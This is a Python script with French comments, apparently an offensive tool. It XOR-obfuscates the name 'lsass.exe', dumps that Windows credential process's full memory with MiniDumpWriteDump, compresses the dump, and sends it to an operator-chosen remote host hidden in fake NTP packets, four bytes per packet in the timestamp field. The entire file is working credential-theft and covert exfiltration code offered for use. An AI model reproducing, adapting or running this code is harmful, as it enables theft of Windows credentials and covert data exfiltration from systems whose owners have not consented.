#!/usr/bin/env python3
import ctypes
import ctypes.wintypes
import math
import psutil
import socket
import sys
import zlib

# --- Fonctions pour la création et l'envoi de faux paquets NTP ---

def create_ntp_packet(payload: bytes) -> bytes:
    """
    Crée un paquet NTP de 48 octets.
    Le champ 'transmit timestamp' (octets 40-47) contiendra les 8 octets de payload.
    """
    packet = bytearray(48)
    packet[0] = 0x1B  # LI=0, VN=3, Mode=3
    data_field = payload.ljust(8, b'\0')[:8]
    packet[40:48] = data_field
    return bytes(packet)

def send_ntp_packet(target_ip: str, target_port: int, payload: bytes) -> None:
    """
    Envoie un paquet NTP modifié vers target_ip:target_port sur UDP,
    en y incluant le payload de 8 octets dans le champ 'transmit timestamp'.
    """
    packet = create_ntp_packet(payload)
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.sendto(packet, (target_ip, target_port))

# --- Fonctions liées au dump mémoire, compression et envoi des données cachées ---

def decode_string(encoded, key):
    """Décode une chaîne obfusquée (XOR avec la clé)."""
    return ''.join(chr(b ^ key) for b in encoded)

def get_target_process_pid(target_process_name):
    """Retourne le PID du processus correspondant au nom cible."""
    for proc in psutil.process_iter(['name']):
        try:
            if proc.info['name'] and proc.info['name'].lower() == target_process_name.lower():
                return proc.pid
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return None

def dump_process_to_memory(pid):
    """
    Effectue un dump mémoire du processus ciblé en utilisant MiniDumpWriteDump.
    Utilise les API Windows via ctypes avec des appels indirects pour créer un mapping mémoire temporaire.
    """
    k32 = ctypes.windll.kernel32
    dbghelp = ctypes.windll.DbgHelp

    # Définition de la signature de MiniDumpWriteDump via CFUNCTYPE (appel indirect)
    MiniDumpWriteDumpProto = ctypes.WINFUNCTYPE(
        ctypes.wintypes.BOOL,
        ctypes.wintypes.HANDLE,     # Process handle
        ctypes.wintypes.DWORD,      # Process ID
        ctypes.wintypes.HANDLE,     # File handle
        ctypes.c_int,               # Dump type
        ctypes.c_void_p,            # Exception param
        ctypes.c_void_p,            # User stream param
        ctypes.c_void_p             # Callback param
    )
    MiniDumpWriteDump = MiniDumpWriteDumpProto(("MiniDumpWriteDump", dbghelp))

    PROCESS_QUERY_INFORMATION = 0x0400
    PROCESS_VM_READ = 0x0010
    process_handle = k32.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, False, pid)
    if not process_handle:
        print("[!] Échec de l'ouverture du processus.")
        return None

    PAGE_READWRITE = 0x04
    FILE_MAP_WRITE = 0x0002
    dump_size = 0x1000000  # 16 MB
    INVALID_HANDLE_VALUE = ctypes.wintypes.HANDLE(-1).value

    k32.CreateFileMappingW.restype = ctypes.wintypes.HANDLE
    memory_file = k32.CreateFileMappingW(ctypes.wintypes.HANDLE(INVALID_HANDLE_VALUE),
                                          None, PAGE_READWRITE, 0, dump_size, None)
    if not memory_file:
        print("[!] Échec de la création du mapping mémoire.")
        k32.CloseHandle(process_handle)
        return None

    k32.MapViewOfFile.restype = ctypes.c_void_p
    buffer_ptr = k32.MapViewOfFile(memory_file, FILE_MAP_WRITE, 0, 0, dump_size)
    if not buffer_ptr:
        print("[!] Échec du mapping de la vue du fichier.")
        k32.CloseHandle(memory_file)
        k32.CloseHandle(process_handle)
        return None

    MiniDumpWithFullMemory = 0x00000002
    if not MiniDumpWriteDump(process_handle, pid, memory_file, MiniDumpWithFullMemory, None, None, None):
        print("[!] MiniDumpWriteDump a échoué.")
        k32.UnmapViewOfFile(buffer_ptr)
        k32.CloseHandle(memory_file)
        k32.CloseHandle(process_handle)
        return None

    dump_data = ctypes.string_at(buffer_ptr, dump_size)

    k32.UnmapViewOfFile(buffer_ptr)
    k32.CloseHandle(memory_file)
    k32.CloseHandle(process_handle)

    return dump_data

def compress_buffer(input_buffer):
    """Compresse le buffer en utilisant zlib."""
    try:
        return zlib.compress(input_buffer)
    except Exception as e:
        print(f"[!] Erreur lors de la compression : {e}")
        return None

def send_compressed_dump_as_ntp(target_ip: str, target_port: int, compressed_data: bytes):
    """
    Fragment le dump compressé et l'envoie sous forme de faux paquets NTP.
    - Le premier paquet est un header de 8 octets :
        • 4 octets : nombre total de paquets de données (unsigned int, big-endian)
        • 4 octets : taille totale du flux compressé (unsigned int, big-endian)
    - Les paquets suivants contiennent chacun 8 octets dont :
        • 4 octets : numéro de séquence (unsigned int, big-endian)
        • 4 octets : fragment de la donnée compressée
    """
    fragment_size = 4
    total_size = len(compressed_data)
    total_fragments = math.ceil(total_size / fragment_size)

    # Envoi du paquet header
    header_payload = total_fragments.to_bytes(4, byteorder='big') + total_size.to_bytes(4, byteorder='big')
    send_ntp_packet(target_ip, target_port, header_payload)
    print(f"[+] Header envoyé : {total_fragments} paquets, {total_size} octets au total.")

    # Envoi des paquets de données
    for seq in range(total_fragments):
        start = seq * fragment_size
        end = start + fragment_size
        fragment = compressed_data[start:end]
        fragment = fragment.ljust(fragment_size, b'\0')
        payload = seq.to_bytes(4, byteorder='big') + fragment
        send_ntp_packet(target_ip, target_port, payload)
        print(f"[+] Paquet {seq+1}/{total_fragments} envoyé.")
    print("[+] Transmission terminée.")

def main():
    # Obfuscation de "lsass.exe" (chaque caractère XOR avec la clé 0x13)
    encoded_target = [
        ord('l') ^ 0x13, ord('s') ^ 0x13, ord('a') ^ 0x13,
        ord('s') ^ 0x13, ord('s') ^ 0x13, ord('.') ^ 0x13,
        ord('e') ^ 0x13, ord('x') ^ 0x13, ord('e') ^ 0x13
    ]
    target_process_name = decode_string(encoded_target, 0x13)
    print(f"[*] Process cible déobfusqué : {target_process_name}")

    # Demande de l'adresse IP et du port du récepteur
    target_ip = input("[*] Entrez l'IP du récepteur : ").strip()
    try:
        target_port = int(input("[*] Entrez le port du récepteur : ").strip())
    except ValueError:
        print("[!] Port invalide.")
        sys.exit(1)

    pid = get_target_process_pid(target_process_name)
    if not pid:
        print("[!] Processus non trouvé.")
        sys.exit(1)
    print(f"[+] Processus {target_process_name} trouvé avec PID {pid}")

    dump_data = dump_process_to_memory(pid)
    if dump_data is None:
        print("[!] Échec du dump mémoire du processus.")
        sys.exit(1)
    print(f"[+] Dump mémoire réalisé. Taille : {len(dump_data)} octets.")

    compressed_data = compress_buffer(dump_data)
    if compressed_data is None:
        print("[!] La compression a échoué.")
        sys.exit(1)
    print(f"[+] Compression réussie. Taille compressée : {len(compressed_data)} octets.")

    send_compressed_dump_as_ntp(target_ip, target_port, compressed_data)

if __name__ == "__main__":
    main()
